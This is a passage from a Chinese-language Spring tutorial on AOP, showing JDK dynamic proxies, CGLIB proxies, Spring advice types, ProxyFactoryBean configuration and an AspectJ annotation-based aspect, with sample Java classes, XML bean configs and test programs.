<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.mengma.jdk;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.mengma.dao.CustomerDao;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.InvocationHandler;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Method;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Proxy;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">MyBeanFactory</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 准备目标类，声明变量并创建 setter 方法，方便后续注入</span></span><br><span class="line">    <span class="keyword">private</span> CustomerDao customerDao;</span><br><span class="line">    <span class="keyword">private</span> MyAspect myAspect;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> CustomerDao <span class="title">getCustomerDao</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> customerDao;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">setCustomerDao</span><span class="params">(CustomerDao customerDao)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.customerDao = customerDao;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> MyAspect <span class="title">getMyAspect</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> myAspect;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">setMyAspect</span><span class="params">(MyAspect myAspect)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.myAspect = myAspect;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 其中 Proxy 的 newProxyInstance() 方法的第一个参数是当前类的类加载器，第二参数是所创建实例的实现类的接口，第三个参数就是需要增强的方法。</span></span><br><span class="line"><span class="comment">     * 在目标类方法执行的前后，分别执行切面类中的 myBefore() 方法和 myAfter() 方法。</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> CustomerDao <span class="title">getBean</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="comment">// </span></span><br><span class="line">        <span class="keyword">return</span>  (CustomerDao) Proxy.newProxyInstance(</span><br><span class="line">                MyBeanFactory.class.getClassLoader(), new Class[]&#123;CustomerDao.class&#125;, new InvocationHandler() &#123;</span><br><span class="line">                    <span class="meta">@Override</span></span><br><span class="line">                    <span class="function"><span class="keyword">public</span> Object <span class="title">invoke</span><span class="params">(Object proxy, Method method, Object[] args)</span> <span class="keyword">throws</span> Throwable </span>&#123;</span><br><span class="line">                        myAspect.myBefore();    <span class="comment">// 前增强</span></span><br><span class="line">                        Object obj = method.invoke(customerDao, args);</span><br><span class="line">                        myAspect.myAfter();     <span class="comment">// 后增强</span></span><br><span class="line">                        <span class="keyword">return</span> obj;</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">        );</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>其中 getBean 方法体中的代码就是使用代理类对创建的实例 customerDao 中的方法进行增强的代码，其中 Proxy 的 newProxyInstance() 方法的第一个参数是当前类的类加载器，第二参数是所创建实例的实现类的接口，第三个参数就是需要增强的方法。</p>
<p>在目标类方法执行的前后，分别执行切面类中的 myBefore() 方法和 myAfter() 方法。</p>
<p>7）修改 applicationContext 配置文件</p>
<p>这里采用设值注入和自动装配的方式</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version="1.0" encoding="UTF-8"?&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">beans</span> <span class="attr">xmlns</span>=<span class="string">"http://www.springframework.org/schema/beans"</span></span></span><br><span class="line"><span class="tag">       <span class="attr">xmlns:xsi</span>=<span class="string">"http://www.w3.org/2001/XMLSchema-instance"</span></span></span><br><span class="line"><span class="tag">       <span class="attr">xsi:schemaLocation</span>=<span class="string">"http://www.springframework.org/schema/beans http://www.springframework.org/schema/beans/spring-beans.xsd"</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">&lt;!--  bean对象  --&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">bean</span> <span class="attr">id</span> = <span class="string">"customerDao"</span> <span class="attr">class</span>=<span class="string">"com.mengma.dao.CustomerDaoImpl"</span>&gt;</span><span class="tag">&lt;/<span class="name">bean</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">bean</span> <span class="attr">id</span> = <span class="string">"myAspect"</span> <span class="attr">class</span>=<span class="string">"com.mengma.jdk.MyAspect"</span>&gt;</span><span class="tag">&lt;/<span class="name">bean</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">bean</span> <span class="attr">id</span> = <span class="string">"myBeanFactory"</span> <span class="attr">class</span>=<span class="string">"com.mengma.jdk.MyBeanFactory"</span> <span class="attr">autowire</span>=<span class="string">"byName"</span>&gt;</span><span class="tag">&lt;/<span class="name">bean</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">beans</span>&gt;</span></span><br></pre></td></tr></table></figure>



<p>8）创建测试类 JDKProxyTest </p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.mengma.jdk;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.mengma.dao.CustomerDao;</span><br><span class="line"><span class="keyword">import</span> org.springframework.context.ApplicationContext;</span><br><span class="line"><span class="keyword">import</span> org.springframework.context.support.ClassPathXmlApplicationContext;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">JDKProxyTest</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        String xmlPath = <span class="string">"applicationContext.xml"</span>;</span><br><span class="line">        ApplicationContext applicationContext = <span class="keyword">new</span> ClassPathXmlApplicationContext(xmlPath);</span><br><span class="line">        MyBeanFactory myBeanFactory = (MyBeanFactory) applicationContext.getBean(<span class="string">"myBeanFactory"</span>);</span><br><span class="line">        CustomerDao customerDao = myBeanFactory.getBean();</span><br><span class="line">        <span class="comment">// 从 Spring 容器中获得指定的代理对象</span></span><br><span class="line">        <span class="comment">// 执行方法</span></span><br><span class="line">        customerDao.add();</span><br><span class="line">        customerDao.update();</span><br><span class="line">        customerDao.delete();</span><br><span class="line">        customerDao.find();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>9）执行结果</p>
<p><img data-src="https://i.loli.net/2021/01/23/GBtrz3CO8DJ9w1W.png" alt="image-20210105160727808"></p>
<h1 id="ⅩⅦ、Spring-CGLlB动态代理（附带实例）"><a href="#ⅩⅦ、Spring-CGLlB动态代理（附带实例）" class="headerlink" title="ⅩⅦ、Spring CGLlB动态代理（附带实例）"></a>ⅩⅦ、Spring CGLlB动态代理（附带实例）</h1><p>通过《Spring JDK动态代理》教程的学习可以知道，JDK 动态代理使用起来非常简单，但是它也有一定的局限性，这是因为 JDK 动态代理必须要实现一个或多个接口，如果不希望实现接口，则可以使用 CGLIB 代理。</p>
<p>CGLIB（Code Generation Library）是一个高性能开源的代码生成包，它被许多 AOP 框架所使用，其底层是通过使用一个小而快的字节码处理框架 ASM（Java 字节码操控框架）转换字节码并生成新的类。因此 CGLIB 要依赖于 ASM 的包，解压 Spring 的核心包 spring-core-3.2.2.RELEASE.jar，文件目录如图所示。</p>
<p><img data-src="https://i.loli.net/2021/01/23/mG1zJAKW7fHpO3B.png" alt="spring-core-3.2.2.RELEASE.jar文件"></p>
<p>在图中可以看出，解压的核心包中包含 cglib 和 asm，也就是说 Spring3.2.13 版本的核心包已经集成了 CGLIB 所需要的包，所以在开发中不需要另外导入 ASM 的 JAR 包了。下面通过案例演示实现 CGLIB 的代理过程。</p>
<h2 id="案例"><a href="#案例" class="headerlink" title="案例"></a>案例</h2><p><strong>在 JDK 动态代理的代码基础上，进行添加和修改</strong></p>
<p>1）在 dao 模块下新建一个类 GoodsDao</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.mengma.dao;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">GoodsDao</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">add</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        System.out.println(<span class="string">"添加商品..."</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">update</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        System.out.println(<span class="string">"修改商品..."</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">delete</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        System.out.println(<span class="string">"删除商品..."</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">find</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        System.out.println(<span class="string">"修改商品..."</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<p>2）新建一个项目模块 com.mengma.cglib ，在模块下新建一个 MyBeanFactory 类</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.mengma.cglib;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.mengma.dao.GoodsDao;</span><br><span class="line"><span class="keyword">import</span> com.mengma.jdk.MyAspect;</span><br><span class="line"><span class="keyword">import</span> org.springframework.cglib.proxy.Enhancer;</span><br><span class="line"><span class="keyword">import</span> org.springframework.cglib.proxy.MethodInterceptor;</span><br><span class="line"><span class="keyword">import</span> org.springframework.cglib.proxy.MethodProxy;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Method;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">MyBeanFactory</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> GoodsDao goodsDao;</span><br><span class="line">    <span class="keyword">private</span> MyAspect myAspect;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">setGoodsDao</span><span class="params">(GoodsDao goodsDao)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.goodsDao = goodsDao;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">setMyAspect</span><span class="params">(MyAspect myAspect)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.myAspect = myAspect;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 创建代理类的返回方法</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> GoodsDao <span class="title">getCglibProxy</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="comment">// 生成代理类，CGLIB 在运行时，生成指定对象的子类</span></span><br><span class="line">        Enhancer enhancer = <span class="keyword">new</span> Enhancer();</span><br><span class="line">        enhancer.setSuperclass(goodsDao.getClass());	<span class="comment">// 指定代理对象</span></span><br><span class="line">        enhancer.setCallback(<span class="keyword">new</span> MethodInterceptor() &#123;</span><br><span class="line">            <span class="meta">@Override</span></span><br><span class="line">            <span class="function"><span class="keyword">public</span> Object <span class="title">intercept</span><span class="params">(Object o, Method method, Object[] objects, MethodProxy methodProxy)</span> <span class="keyword">throws</span> Throwable </span>&#123;</span><br><span class="line">                myAspect.myBefore();</span><br><span class="line">                Object result = method.invoke(goodsDao,objects);</span><br><span class="line">                myAspect.myAfter();</span><br><span class="line">                <span class="keyword">return</span> result;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;);</span><br><span class="line">        <span class="comment">// 创建代理类</span></span><br><span class="line">        GoodsDao goodsDaoProxy = (GoodsDao) enhancer.create();</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> goodsDaoProxy;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// 确定需要增强的类</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>3）创建测试类 CglibProxyTest</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.mengma.cglib;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.mengma.dao.GoodsDao;</span><br><span class="line"><span class="keyword">import</span> com.mengma.jdk.MyAspect;</span><br><span class="line"><span class="keyword">import</span> org.springframework.context.ApplicationContext;</span><br><span class="line"><span class="keyword">import</span> org.springframework.context.support.ClassPathXmlApplicationContext;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">CglibProxyTest</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        String xmlPath = <span class="string">"applicationContext.xml"</span>;</span><br><span class="line">        ApplicationContext applicationContext = <span class="keyword">new</span> ClassPathXmlApplicationContext(xmlPath);</span><br><span class="line">        MyBeanFactory myBeanFactory = (MyBeanFactory) applicationContext.getBean(<span class="string">"myBeanFactory1"</span>);</span><br><span class="line">        GoodsDao goodsDaoProxy = (GoodsDao) myBeanFactory.getCglibProxy();</span><br><span class="line">        goodsDaoProxy.add();</span><br><span class="line">        goodsDaoProxy.delete();</span><br><span class="line">        goodsDaoProxy.find();</span><br><span class="line">        goodsDaoProxy.update();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>对于配置文件的更改，留作思考</p>
<p>4）运行检查</p>
<p><img data-src="https://i.loli.net/2021/01/23/lqfZnBGrL9gX8zI.png" alt="image-20210106154255321"></p>
<h1 id="ⅩⅧ、Spring通知类型及使用ProxyFactoryBean创建AOP代理"><a href="#ⅩⅧ、Spring通知类型及使用ProxyFactoryBean创建AOP代理" class="headerlink" title="ⅩⅧ、Spring通知类型及使用ProxyFactoryBean创建AOP代理"></a>ⅩⅧ、Spring通知类型及使用ProxyFactoryBean创建AOP代理</h1><p>在《Spring JDK动态代理》和《Spring CGLlB动态代理》中，讲解了 AOP 手动代理的两种方式，下面通过讲解 Spring 的通知介绍 Spring 是如何创建 AOP 代理的。</p>
<h2 id="Spring-通知类型"><a href="#Spring-通知类型" class="headerlink" title="Spring 通知类型"></a>Spring 通知类型</h2><p>通过前面的学习可以知道，通知（Advice）其实就是对目标切入点进行增强的内容，Spring AOP 为通知（Advice）提供了 org.aopalliance.aop.Advice 接口。</p>
<p>Spring 通知按照在目标类方法的连接点位置，可以分为以下五种类型，如表 1 所示。</p>
<table>
<thead>
<tr>
<th>名称</th>
<th>说明</th>
</tr>
</thead>
<tbody><tr>
<td>org.springframework.aop.MethodBeforeAdvice（前置通知）</td>
<td>在方法之前自动执行的通知称为前置通知，可以应用于权限管理等功能。</td>
</tr>
<tr>
<td>org.springframework.aop.AfterReturningAdvice（后置通知）</td>
<td>在方法之后自动执行的通知称为后置通知，可以应用于关闭流、上传文件、删除临时文件等功能。</td>
</tr>
<tr>
<td>org.aopalliance.intercept.MethodInterceptor（环绕通知）</td>
<td>在方法前后自动执行的通知称为环绕通知，可以应用于日志、事务管理等功能。</td>
</tr>
<tr>
<td>org.springframework.aop.ThrowsAdvice（异常通知）</td>
<td>在方法抛出异常时自动执行的通知称为异常通知，可以应用于处理异常记录日志等功能。</td>
</tr>
<tr>
<td>org.springframework.aop.IntroductionInterceptor（引介通知）</td>
<td>在目标类中添加一些新的方法和属性，可以应用于修改旧版本程序（增强类）。</td>
</tr>
</tbody></table>
<h2 id="声明式-Spring-AOP"><a href="#声明式-Spring-AOP" class="headerlink" title="声明式 Spring AOP"></a>声明式 Spring AOP</h2><p>Spring 创建一个 AOP 代理的基本方法是使用org.springframework.aop.framework.ProxyFactoryBean，这个类对应的切入点和通知提供了完整的控制能力，并可以生成指定的内容。</p>
<p>ProxyFactoryBean 类中的常用可配置属性如表 2 所示。</p>
<table>
<thead>
<tr>
<th>属性名称</th>
<th>描 述</th>
</tr>
</thead>
<tbody><tr>
<td>target</td>
<td>代理的目标对象</td>
</tr>
<tr>
<td>proxyInterfaces</td>
<td>代理要实现的接口，如果有多个接口，则可以使用以下格式赋值： <list>   <value></value>   … </list></td>
</tr>
<tr>
<td>proxyTargetClass</td>
<td>是否对类代理而不是接口，设置为 true 时，使用 CGLIB 代理</td>
</tr>
<tr>
<td>interceptorNames</td>
<td>需要植入目标的 Advice</td>
</tr>
<tr>
<td>singleton</td>
<td>返回的代理是否为单例，默认为 true（返回单实例）</td>
</tr>
<tr>
<td>optimize</td>
<td>当设置为 true 时，强制使用 CGLIB</td>
</tr>
</tbody></table>
<h2 id="实例-1"><a href="#实例-1" class="headerlink" title="实例"></a>实例</h2><p>1）导入依赖</p>
<p>2）创建切面类 MyAspect</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.mengma.factorybean;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 使用编译器的自动导入的时候注意，Method* 两个类同时也存在于其他类下面，认真选择</span></span><br><span class="line"><span class="keyword">import</span> org.aopalliance.intercept.MethodInterceptor;</span><br><span class="line"><span class="keyword">import</span> org.aopalliance.intercept.MethodInvocation;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 需要实现接口，确定哪个通知，以及告诉 Spring 应该执行哪个方法</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">MyAspect</span> <span class="keyword">implements</span> <span class="title">MethodInterceptor</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> Object <span class="title">invoke</span><span class="params">(MethodInvocation methodInvocation)</span> <span class="keyword">throws</span> Throwable </span>&#123;</span><br><span class="line">        System.out.println(<span class="string">"方法执行之前...."</span>);</span><br><span class="line">        <span class="comment">// 执行目标方法</span></span><br><span class="line">        Object object = methodInvocation.proceed();</span><br><span class="line">        System.out.println(<span class="string">"方法执行之后...."</span>);</span><br><span class="line">        <span class="keyword">return</span> object;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>3）在 com.mengma.factorybean 下创建配置文件 applicationContext.xml</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version="1.0" encoding="UTF-8"?&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">beans</span> <span class="attr">xmlns</span>=<span class="string">"http://www.springframework.org/schema/beans"</span></span></span><br><span class="line"><span class="tag">       <span class="attr">xmlns:xsi</span>=<span class="string">"http://www.w3.org/2001/XMLSchema-instance"</span></span></span><br><span class="line"><span class="tag">       <span class="attr">xsi:schemaLocation</span>=<span class="string">"http://www.springframework.org/schema/beans http://www.springframework.org/schema/beans/spring-beans.xsd"</span>&gt;</span></span><br><span class="line">    <span class="comment">&lt;!--  目标类  --&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">bean</span> <span class="attr">id</span>=<span class="string">"customerDao"</span> <span class="attr">class</span>=<span class="string">"com.mengma.dao.CustomerDaoImpl"</span>&gt;</span><span class="tag">&lt;/<span class="name">bean</span>&gt;</span></span><br><span class="line">    <span class="comment">&lt;!--  通知 advice  --&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">bean</span> <span class="attr">id</span>=<span class="string">"myAspect"</span> <span class="attr">class</span>=<span class="string">"com.mengma.factorybean.MyAspect"</span>&gt;</span><span class="tag">&lt;/<span class="name">bean</span>&gt;</span></span><br><span class="line">    <span class="comment">&lt;!--    生成代理对象       --&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">bean</span> <span class="attr">id</span>=<span class="string">"customerDaoProxy"</span> <span class="attr">class</span>=<span class="string">"org.springframework.aop.framework.ProxyFactoryBean"</span>&gt;</span></span><br><span class="line">        <span class="comment">&lt;!--  代理接口的实现  --&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">"proxyInterfaces"</span> <span class="attr">value</span>=<span class="string">"com.mengma.dao.CustomerDao"</span>/&gt;</span></span><br><span class="line">        <span class="comment">&lt;!--   代理的目标对象     --&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">"target"</span> <span class="attr">ref</span>=<span class="string">"customerDao"</span>/&gt;</span></span><br><span class="line">        <span class="comment">&lt;!--    用通知增强目标    --&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">"interceptorNames"</span> <span class="attr">value</span>=<span class="string">"myAspect"</span>/&gt;</span></span><br><span class="line">        <span class="comment">&lt;!--    如何生成代理，true：使用cglib ；false：使用 jdk 动态代理--&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">"proxyTargetClass"</span> <span class="attr">value</span>=<span class="string">"true"</span>/&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">bean</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">beans</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>5）创建测试类 MyFactoryBeanTest</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.mengma.factorybean;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.mengma.dao.CustomerDao;</span><br><span class="line"><span class="keyword">import</span> org.springframework.context.ApplicationContext;</span><br><span class="line"><span class="keyword">import</span> org.springframework.context.support.ClassPathXmlApplicationContext;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">MyBeanFactoryTest</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        String xmlPath = <span class="string">"com\\mengma\\factorybean\\applicationContext.xml"</span>;</span><br><span class="line">        ApplicationContext applicationContext = <span class="keyword">new</span> ClassPathXmlApplicationContext(xmlPath);</span><br><span class="line">        CustomerDao customerDao = (CustomerDao) applicationContext.getBean(<span class="string">"customerDaoProxy"</span>);</span><br><span class="line">        customerDao.find();</span><br><span class="line">        customerDao.add();</span><br><span class="line">        customerDao.delete();</span><br><span class="line">        customerDao.update();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>6）运行测试</p>
<p><img data-src="https://i.loli.net/2021/01/23/Z945wns1OPGQHDL.png" alt="image-20210106162100778"></p>
<h1 id="ⅩⅨ、Spring使用AspectJ开发AOP：基于XML和基于Annotation"><a href="#ⅩⅨ、Spring使用AspectJ开发AOP：基于XML和基于Annotation" class="headerlink" title="ⅩⅨ、Spring使用AspectJ开发AOP：基于XML和基于Annotation"></a>ⅩⅨ、Spring使用AspectJ开发AOP：基于XML和基于Annotation</h1><p>AspectJ 是一个基于 Java 语言的 AOP 框架，它扩展了 Java 语言。Spring 2.0 以后，新增了对 AspectJ 方式的支持，新版本的 Spring 框架，建议使用 AspectJ 方式开发 AOP。</p>
<p>使用 AspectJ 开发 AOP 通常有两种方式：</p>
<ul>
<li>基于 XML 的声明式。</li>
<li>基于 Annotation 的声明式。</li>
</ul>
<p>实际上项目开发中使用的一般是 Annotation 的声明式，这也是官方推荐的，接下来将对基于 Annotation AOP 的开发方式进行讲解。（如有对基于 XML 声明式的需要可以自行搜索）</p>
<h2 id="1、基于-Annotation-的声明式"><a href="#1、基于-Annotation-的声明式" class="headerlink" title="1、基于 Annotation 的声明式"></a>1、基于 Annotation 的声明式</h2><p>基于 XML 的声明式是指通过 Spring 配置文件的方式定义切面、切入点及声明通知，而所有的切面和通知都必须定义在 aop:config 元素中。</p>
<p>下面通过案例演示 Spring 中如何使用基于 XML 的声明式实现 AOP 的开发。</p>
<p>1）添加依赖</p>
<p>使用 AspectJ 除了要导入 Spring AOP 的 JAR 包（默认已经导入）之外，还需要导入 AspectJ 相关的 JAR 包，可以在 <a href="https://www.eclipse.org/aspectj/downloads.php" target="_blank" rel="noopener">官方仓库</a> 下载自己需要的版本。下载完毕之后将 JAR 包解压，在压缩包 file -&gt; lib 下面</p>
<p><img data-src="https://i.loli.net/2021/01/23/pNGM7a5SXOg9qr8.png" alt="image-20210107105055869"></p>
<p>解压出来后把 JAR 包添加到项目结构的全局库中：<br><img data-src="https://i.loli.net/2021/01/23/WMnlmJxb1ZgwCh6.png" alt="image-20210106173654668"></p>
<p><img data-src="https://i.loli.net/2021/01/23/gBpOcwuWFPMILYe.png" alt="image-20210106173805902"></p>
<p>点击 + 号，选择 Java 后选择刚才解压好的 AspectJ JAR 包，将其加入到依赖中，确定</p>
<p>2）创建切面类 MyAspect</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.mengma.aspectj.xml;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.aspectj.lang.JoinPoint;</span><br><span class="line"><span class="keyword">import</span> org.aspectj.lang.ProceedingJoinPoint;</span><br><span class="line"><span class="keyword">import</span> org.aspectj.lang.annotation.*;</span><br><span class="line"><span class="keyword">import</span> org.springframework.stereotype.Component;</span><br><span class="line"></span><br><span class="line"><span class="meta">@Aspect</span></span><br><span class="line"><span class="meta">@Component</span>      <span class="comment">// @Aspect 注解一定要和 @Component 一起使用，不然拦截不到方法</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">MyAspect</span> </span>&#123;</span><br><span class="line">    <span class="meta">@Pointcut</span>(<span class="string">"execution(* com.mengma.dao..*(..))"</span>)</span><br><span class="line">    <span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">myPointCut</span><span class="params">()</span></span>&#123;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// 前置通知</span></span><br><span class="line">    <span class="meta">@Before</span>(<span class="string">"myPointCut()"</span>)</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">myBefore</span> <span class="params">(JoinPoint joinPoint)</span></span>&#123;</span><br><span class="line">        System.out.print(<span class="string">"前置通知，目标："</span>);</span><br><span class="line">        System.out.print(joinPoint.getTarget() + <span class="string">"方法名称:"</span>);</span><br><span class="line">        System.out.println(joinPoint.getSignature().getName()); <span class="comment">// 调用方法获取方法名称</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 后置通知</span></span><br><span class="line">    <span class="meta">@AfterReturning</span>(<span class="string">"myPointCut()"</span>)</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">myAfterReturning</span><span class="params">(JoinPoint joinPoint)</span></span>&#123;</span><br><span class="line">        System.out.print(<span class="string">"后置通知，方法名称："</span> + joinPoint.getSignature().getName());</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 环绕通知</span></span><br><span class="line">    <span class="meta">@Around</span>(<span class="string">"myPointCut()"</span>)</span><br><span class="line">    <span class="function"><span class="keyword">public</span> Object <span class="title">myAround</span><span class="params">(ProceedingJoinPoint proceedingJoinPoint)</span> <span class="keyword">throws</span> Throwable </span>&#123;</span><br><span class="line">        System.out.println(<span class="string">"环绕开始"</span>);</span><br><span class="line">        Object obj = proceedingJoinPoint.proceed();</span><br><span class="line">        System.out.println(<span class="string">"环绕结束"</span>);</span><br><span class="line">        <span class="keyword">return</span> obj;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 异常通知</span></span><br><span class="line">    <span class="meta">@AfterThrowing</span>(value = <span class="string">"myPointCut()"</span> ,throwing = <span class="string">"e"</span>)</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">myAfterThrowing</span><span class="params">(JoinPoint joinPoint,Throwable e)</span></span>&#123;</span><br><span class="line">        System.out.println(<span class="string">"异常通知"</span> + <span class="string">"出错了"</span> + e.getMessage());</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 最终通知</span></span><br><span class="line">    <span class="meta">@After</span>(<span class="string">"myPointCut()"</span>)</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">myAfter</span><span class="params">()</span></span>&#123;</span><br><span class="line">        System.out.println(<span class="string">"最终通知"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>2）修改配置文件</p>
